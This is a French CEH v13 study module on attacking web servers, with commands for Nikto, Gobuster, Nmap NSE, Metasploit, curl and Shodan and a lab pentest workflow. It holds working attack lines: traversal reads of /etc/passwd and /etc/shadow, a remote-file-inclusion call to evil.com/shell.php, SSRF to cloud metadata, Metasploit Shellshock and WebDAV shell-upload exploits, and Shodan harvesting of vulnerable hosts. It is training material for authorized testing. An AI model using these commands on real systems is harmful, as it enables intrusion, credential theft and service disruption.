# 🔴 Module 13 — Outils & Labs : Hacking Web Servers

> **CEH v13 | EC-Council**  
> `#Nikto` `#Nmap` `#Gobuster` `#Metasploit` `#curl` `#Shodan`

---

## 📌 Table des matières

1. [Nikto — Scanner de vulnérabilités web](#1-nikto)
2. [Gobuster / Dirb — Énumération de répertoires](#2-gobuster--dirb)
3. [Nmap NSE — Scripts web](#3-nmap-nse)
4. [Metasploit — Modules web server](#4-metasploit)
5. [curl / wget — Tests manuels](#5-curl--wget)
6. [Shodan — Reconnaissance passive](#6-shodan)
7. [Workflow de lab complet](#7-workflow-complet)

---

## 1. Nikto — Scanner de Vulnérabilités Web

Nikto est un scanner open-source qui teste les serveurs web contre des milliers de vérifications.

```bash
# Scan basique :
nikto -h http://target.com

# Avec SSL :
nikto -h https://target.com -ssl

# Sur un port non standard :
nikto -h http://target.com:8080

# Sauvegarder le rapport :
nikto -h http://target.com -o rapport.html -Format html
nikto -h http://target.com -o rapport.xml -Format xml

# Scan avec authentification :
nikto -h http://target.com -id admin:password

# Scan spécifique (test de méthodes HTTP) :
nikto -h http://target.com -Tuning 5   # Identification uniquement
nikto -h http://target.com -Tuning 3   # Test des mauvaises configurations

# Via proxy Burp Suite :
nikto -h http://target.com -useproxy http://127.0.0.1:8080
```

### Ce que Nikto détecte

```
- Fichiers/répertoires sensibles (admin, backup, config...)
- Méthodes HTTP dangereuses (PUT, DELETE, TRACE)
- Headers de sécurité manquants
- Versions serveur obsolètes
- Pages par défaut (phpmyadmin, weblogic, tomcat)
- Vulnérabilités connues (CVE spécifiques)
- Directory listing activé
- Fichiers .htaccess, .htpasswd exposés
```

---

## 2. Gobuster / Dirb — Énumération de Répertoires

Brute-forcer les répertoires et fichiers cachés d'un serveur web.

```bash
# ─── GOBUSTER ─────────────────────────────────────────────────
# Scan des répertoires :
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Avec extensions de fichiers :
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,html,txt,bak,old,zip

# Chercher des fichiers spécifiques :
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

# Mode DNS (sous-domaines) :
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Avec proxy et délai :
gobuster dir -u http://target.com -w wordlist.txt --proxy http://127.0.0.1:8080 --delay 200ms

# ─── DIRB ─────────────────────────────────────────────────────
dirb http://target.com
dirb http://target.com /usr/share/dirb/wordlists/big.txt
dirb https://target.com -a "Mozilla/5.0"  # Custom User-Agent

# ─── FFUF ─────────────────────────────────────────────────────
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403
```

---

## 3. Nmap NSE — Scripts Web

```bash
# ─── ÉNUMÉRATION ───────────────────────────────────────────────
nmap --script http-enum -p 80,443 target.com
nmap --script http-title -p 80 target.com
nmap --script http-headers -p 80 target.com
nmap --script http-methods -p 80 target.com      # Méthodes HTTP autorisées

# ─── VULNÉRABILITÉS ────────────────────────────────────────────
nmap --script http-shellshock target.com          # ShellShock (CVE-2014-6271)
nmap --script http-slowloris-check target.com     # SlowLoris DoS
nmap --script http-php-version target.com         # Version PHP
nmap --script http-wordpress-enum target.com      # WordPress plugins/themes

# ─── WEBDAV ────────────────────────────────────────────────────
nmap --script http-webdav-scan target.com
nmap --script http-dav-source-ip target.com

# ─── COMBINÉ ───────────────────────────────────────────────────
nmap -sV --script "http-*" -p 80,443 target.com
```

---

## 4. Metasploit — Modules Web Server

```bash
# ─── SCAN ET ÉNUMÉRATION ───────────────────────────────────────
use auxiliary/scanner/http/http_version
set RHOSTS target.com
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS target.com
set PATH /
run

# ─── WEBDAV ────────────────────────────────────────────────────
use auxiliary/scanner/http/webdav_scanner
set RHOSTS target.com
run

use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS target.com
set FILENAME shell.asp
run

# ─── SHELLSHOCK (Apache CGI) ───────────────────────────────────
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.com
set TARGETURI /cgi-bin/test.sh
set LHOST attacker_ip
run

# ─── MS15-034 (IIS) ────────────────────────────────────────────
use auxiliary/dos/http/ms15_034_ulonglongadd
set RHOSTS target.com
run
```

---

## 5. curl / wget — Tests Manuels

```bash
# ─── BANNER GRABBING ───────────────────────────────────────────
curl -I http://target.com                         # Headers seulement
curl -v http://target.com 2>&1 | head -30         # Verbose
telnet target.com 80                              # Manuel

# ─── TESTER LES MÉTHODES HTTP ──────────────────────────────────
curl -X OPTIONS http://target.com -v              # Méthodes supportées
curl -X TRACE http://target.com -v                # XST test
curl -X PUT http://target.com/test.txt -d "test"  # WebDAV PUT

# ─── DIRECTORY TRAVERSAL ───────────────────────────────────────
curl "http://target.com/files?name=../../../../etc/passwd"
curl "http://target.com/page?file=../../../etc/shadow"

# ─── RFI ───────────────────────────────────────────────────────
curl "http://target.com/index.php?page=http://evil.com/shell.php"

# ─── SSRF ──────────────────────────────────────────────────────
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target.com/proxy?target=http://localhost/admin"

# ─── TÉLÉCHARGER AVEC WGET ─────────────────────────────────────
wget -r -nd http://target.com/           # Télécharger tout le site
wget http://target.com/robots.txt        # Fichier spécifique
```

---

## 6. Shodan — Reconnaissance Passive

```bash
# Interface web : https://www.shodan.io
# Requêtes Shodan pour serveurs web :

# Trouver serveurs Apache vulnérables :
"Apache/2.4.29" country:FR

# Trouver IIS exposés :
"IIS/7.5" org:"Target Company"

# Serveurs avec page par défaut :
http.title:"Welcome to nginx"
http.title:"Apache2 Ubuntu Default Page"

# Tomcat avec console exposée :
http.title:"Apache Tomcat" port:8080

# phpMyAdmin exposé :
http.title:"phpMyAdmin"

# Via CLI (shodan-cli) :
shodan search --fields ip_str,port,org "Apache/2.4.29" > apache_targets.txt
shodan host 1.2.3.4          # Informations sur une IP spécifique
```

---

## 7. Workflow de Lab Complet

```
Scénario : Pentest d'un serveur web (environnement de lab)

Étape 1 : Reconnaissance passive
  shodan search "Apache" hostname:target.com
  → Obtenir version et ports

Étape 2 : Scan actif
  nmap -sV -p 80,443,8080,8443 --script http-enum,http-headers target.com
  → Version, répertoires, headers

Étape 3 : Scanner avec Nikto
  nikto -h http://target.com -o nikto_report.html -Format html
  → Identifier vulnérabilités et mauvaises configs

Étape 4 : Énumération de répertoires
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt -x php,bak,zip
  → Trouver : /admin/, /backup.zip, /config.php.bak

Étape 5 : Exploitation (exemple)
  curl http://target.com/config.php.bak
  → Récupérer credentials DB

  msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
  → Shell sur le serveur

Étape 6 : Documentation
  Capturer les preuves (screenshots, requêtes/réponses)
  Documenter la chaîne d'exploitation
```

---

## 🧠 Points clés à retenir pour l'examen

- **Nikto** = scanner de vulnérabilités web (thousands of checks)
- **Gobuster** = brute-force de répertoires et fichiers
- **davtest** = test d'upload WebDAV par type de fichier
- **cadaver** = client WebDAV interactif
- `nmap --script http-*` = large palette de scripts NSE pour web
- **Shodan** = moteur de recherche pour appareils connectés (pasif)
- Le **banner grabbing** avec `curl -I` ou `telnet` est une technique fondamentale CEH

---

*⬅️ [Techniques avancées](./03_techniques_avancees.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
